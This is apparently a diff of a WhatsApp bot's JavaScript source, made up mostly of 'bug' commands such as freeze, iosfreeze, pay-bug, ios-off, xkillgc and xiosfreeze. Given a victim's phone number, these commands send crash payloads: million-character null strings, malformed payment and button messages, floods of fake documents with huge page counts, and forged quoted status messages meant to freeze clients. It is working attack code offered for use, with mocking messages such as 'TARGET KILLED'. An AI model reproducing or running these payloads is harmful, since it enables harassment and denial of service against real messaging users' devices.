-"abcdef1234567890",
-"hex"
-),
-inviteLinkGroupTypeV2: 0,
-viewOnce: true
-}
-},
-{
-participant: {
-jid: jid
-}
-}
-);
-}
-for (let i = `3`; i !== 0; i -= 1) {
-await AlyaBotInc.relayMessage(
-jid,
-{
-viewOnceMessage: {
-message: {
-messageContextInfo: {
-deviceListMetadataVersion: 2,
-deviceListMetadata: {}
-},
-interactiveMessage: {
-nativeFlowMessage: {
-buttons: [{
-name: "payment_info",
-buttonParamsJson:
-'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"☠️드림 가이 KING","key":"+916909137213","key_type":"X"}}]}'
-}]
-}
-}
-}
-}
-},
-{
-participant: {
-jid: jid
-}
-},
-{
-messageId: null
-}
-);
-}
-for (let i = `3`; i !== 0; i -= 1) {
-await AlyaBotInc.relayMessage(
-jid,
-{
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-header: {
-title: "",
-subtitle: " "
-},
-body: {
-text: "👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA"
-},
-footer: {
-text: "xp"
-},
-nativeFlowMessage: {
-buttons: [{
-name: "cta_url",
-buttonParamsJson:
-"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
-}],
-messageParamsJson:
-"\0".repeat(1000000)
-}
-}
-}
-}
-},
-{
-participant: {
-jid: jid
-}
-}
-);
-}
-}
-await replygcalya(`In process....`);
-await alyareignsShot(whatsappNumber);
-sendMessageWithMentions(
-"Successfully Sent Bug To @" +
-whatsappNumber.split("@")[0] +
-" Using *" +
-command +
-"👑ALYA IS SUPREME 👑",
-[whatsappNumber]
-);
-}
-break;
-case "freeze": 
-case "🥶": {
-if (!isPremium) return replygcalya(mess.prem);
-const AlyaDoc = {
-url: "./src/data/function/ABug/x.mp3"
+break
+case 'xfreeze': case 'xblankscrn': {
+	if (!isPremium) return replygcalya(mess.prem)
+	const XeonDoc = {
+    url: "./src/data/function/ABug/x.mp3"
 };
-async function alyaFreeze(jid) {
-for (let i = 0; i < 50; i++) {
+async function xeonFreeze(jid){
+	  for (let i = 0; i < 50; i++) {
 await AlyaBotInc.sendMessage(jid, {
-document: AlyaDoc,
-fileName: "👑ALYA IS SUPREME 👑" + alyatext1,
-mimetype: "application/zip",
-caption: "👑ALYA IS SUPREME 👑" + alyatext1,
-pageCount: 0x3b9aca00,
-contactVcard: true
+    'document': XeonDoc,
+    'fileName': "👑 KING" + alyatext1,
+    'mimetype': "application/zip",
+    'caption': "👑 KING" + alyatext1,
+    'pageCount': 0x3b9aca00,
+    'contactVcard': true
 });
 }
 }
 
-await alyaFreeze(m.chat);
-}
-break;
-case "iosfreeze": {
-if (!isPremium) return replygcalya(mess.prem);
-const subscribe_alya = {
-key: {
-fromMe: false,
-participant: "0@s.whatsapp.net",
-remoteJid: "status@broadcast"
-},
-message: {
-listResponseMessage: {
-title: `👑ALYA IS SUPREME 👑`
-}
-}
+await xeonFreeze(m.chat);
+	}
+	break
+	case 'xkillgc': case 'xblankscrn': case 'xwebgc': {
+		if (!isPremium) return replygcalya(mess.prem)
+		const xeonimage = {
+    title: "👑 KING; ",
+    hasMediaAttachment: true,
+    imageMessage: thumb.imageMessage
 };
-async function alyaCrashyIos(alya, chat, participant) {
-AlyaBotInc.sendMessage(
-chat,
-{
-document: {
-url: "./settings.js"
-},
-mimetype: `image/null`,
-fileName: `👑ALYA${alyatext6}`,
-caption: `👑ALYA ${alyatext6}`
-},
-{
-quoted: {
-...subscribe_alya,
-key: {
-...subscribe_alya.key,
-participant
-}
-}
-} // Includes the quoted participant
-);
-}
-async function executeIosAttack() {
-if (!args[0]) amount = `99`;
-for (let i = 1; i < 10; i++) {
-alyaCrashyIos(pushname, m.chat, sender); // Make sure to pass the participant here
-}
-}
-await executeIosAttack();
-}
 
-break;
+const xtext = {
+    text: ''
+};
 
-case "pay-bug":
-{
-if (!AlyaTheQueen) return replygcalya(mess.owner);
-if (!text)
-return replygcalya(`Usage .${command} 2348100xxxxxxx`);
-let cleanedNumber = text.replace(/[^0-9]/g, "");
-if (cleanedNumber.startsWith("0"))
-return replygcalya(
-`Example : ${prefix + command} 2348100xxxxxxx`
-);
-var contactInfo = await AlyaBotInc.onWhatsApp(
-cleanedNumber + "@s.whatsapp.net"
-);
-let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-if (cleanedNumber == "2348100xxxxxxx") {
-return;
-}
-if (cleanedNumber == "2348100xxxxxxx") {
-return;
-}
-if (cleanedNumber == "2348100xxxxxxx") {
-return;
-}
-if (contactInfo.length == 0) {
-return replygcalya(
-"The number is not registered on WhatsApp"
-);
-}
-async function alyaBugPay(jid) {
-await AlyaBotInc.relayMessage(
-jid,
-{
-viewOnceMessage: {
+AlyaBotInc.relayMessage(m.chat, {
+    'viewOnceMessage': {
+        'message': {
+            'interactiveMessage': {
+                'header': xeonimage,
+                'body': xtext,
+                'nativeFlowMessage': {
+                    'buttons': [{
+                        'name': "galaxy_message",
+                        'buttonParamsJson': JSON.stringify({
+                            'header': "👑 KING; ",
+                            'body': "xxx",
+                            'flow_action': "navigate",
+                            'flow_action_payload': {
+                                'screen': "FORM_SCREEN"
+                            },
+                            'flow_cta': "xxxxx",
+                            'flow_id': "1169834181134583",
+                            'flow_message_version': '3',
+                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+                        })
+                    }],
+                    'messageParamsJson': ''
+                },
+                'contextInfo': {
+                    'isForwarded': true,
+                    'fromMe': false,
+                    'participant': "0@s.whatsapp.net",
+                    'remoteJid': m.chat,
+                    'quotedMessage': {
+                        'documentMessage': {
+                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
+                            'mimetype': "application/pdf",
+                            'title': "crash",
+                            'pageCount': 0x3b9aca00,
+                            'fileName': "crash.pdf",
+                            'contactVcard': true
+                        }
+                    },
+                    'forwardedNewsletterMessageInfo': {
+                        'newsletterJid': "https://whatsapp.com/channel/0029VaeW5Tw4yltQOYIO5E2D",
+                        'serverMessageId': 0x1,
+                        'newsletterName': "👑 KING"
+                    }
+                }
+            }
+        }
+    }
+}, {});
+		}
+		break
+		case 'xiosfreeze': case 'xioshot':{
+			if (!isPremium) return replygcalya(mess.prem)
+			const subscribe_dgxeon = {
+"key": { 
+"fromMe": false,
+"participant": '0@s.whatsapp.net',
+"remoteJid": 'status@broadcast' 
+},
 message: {
-messageContextInfo: {
-deviceListMetadataVersion: 2,
-deviceListMetadata: {}
-},
-interactiveMessage: {
-nativeFlowMessage: {
-buttons: [{
-name: "payment_info",
-buttonParamsJson:
-'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}'
-}]
+"listResponseMessage": {
+title: `Xeon's ur father`
+}}
 }
+			async function XeonyCrashyIos(dgxeon, chat, participant) {
+  AlyaBotInc.sendMessage(
+    chat,
+    {
+      document: { url: "./settings.js" },
+      mimetype: `image/null`,
+      fileName: `👑 KING${alyatext1}`,
+      caption: `👑 KING ${alyatext1}`,
+    },
+    { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
+  );
 }
-}
-}
-},
-{
-participant: {
-jid: jid
-}
-},
-{
-messageId: null
-}
-);
-}
-await alyaBugPay(whatsappNumber);
-sendMessageWithMentions(
-"Successfully Sent Bug To @" +
-whatsappNumber.split("@")[0] +
-" Using *" +
-command +
-"👑ALYA IS SUPREME 👑",
-[whatsappNumber]
-);
-}
-break;
-case "ios-off": {
-if (!isPremium) return replygcalya(mess.prem);
-if (!text)
-return replygcalya(
-`Use ${
-prefix + command
-} Victim number|total\nExample ${
-prefix + command
-} 23481xxxxxxxx,5`
-);
-let number = text.split(",")[0];
-let amount = text.split(",")[1] * 5;
-if (!number || !amount) {
-return replygcalya(
-`Use ${
-prefix + command
-} Victim number|total\nExample ${
-prefix + command
-} 23481xxxxxxxx,5`
-);
-}
-if (isNaN(parseInt(amount))) {
-return replygcalya("The amount must be a number");
-}
-let cleanedNumber = number.replace(/[^0-9]/g, "");
-let encodedAmount = "" + encodeURI(amount);
-var contactInfo = await AlyaBotInc.onWhatsApp(
-cleanedNumber + "@s.whatsapp.net"
-);
-let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-if (cleanedNumber == "2349123721026") {
-return;
-}
-if (contactInfo.length == 0) {
-return replygcalya(
-"The number is not registered on WhatsApp"
-);
-}
-replygcalya(
-"please wait, " + command + " hack is in process.."
-);
-await sleep(2000); // Adjusted sleep time for clarity
-sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
-await sleep(2500); // Adjusted sleep time for clarity
-sendMessageWithMentions(
-"TARGET KILLED ☠️ @" +
-whatsappNumber.split("@")[0] +
-" Using *" +
-command +
-"👑ALYA IS SUPREME 👑",
-[whatsappNumber]
-);
-}
-break;
-case "x-ios": {
-if (!isPremium) return replygcalya(mess.prem);
-if (!isBot) {
-return replygcalya("*This feature is only for the bot!*");
-}
-if (!text) {
-return replygcalya(
-`Example usage: ${prefix + command} 5`
-);
-}
-if (isNaN(parseInt(text))) {
-return replygcalya("The amount must be a number");
-}
-let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-replygcalya(
-"please wait, " +
-command +
-" bug in process...."
-);
-await sleep(1500); // Adjusted sleep time for clarity
-sendMultiplePaymentInvites(from, encodedValue);
-await sleep(2500); // Adjusted sleep time for clarity
-sendReaction("âœ…");
-}
-break;
+  async function executeIosAttack() {
+    if (!args[0]) amount = `99`;
+    for (let i = 1; i < 10; i++) {
+      XeonyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
+      
+    }
+    }
+            await executeIosAttack();
+            }
+    break;
 case "lockotp":
 case "tempban":
 {
